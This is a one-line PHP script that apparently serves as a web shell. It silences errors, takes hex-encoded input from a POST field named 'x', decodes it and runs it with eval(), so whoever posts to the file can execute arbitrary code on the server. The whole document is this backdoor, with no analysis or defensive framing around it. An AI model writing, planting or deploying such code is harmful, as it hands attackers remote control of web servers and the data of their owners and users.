<?php error_reporting(0);set_time_limit(0);$a=$_POST["x"];if($a){$a=str_replace(array("\n","\t","\r"),"",$a);$b="";for($i=0;$i<strlen($a);$i+=2)$b.=urldecode("%".substr($a,$i,2));eval($b);exit;};?>
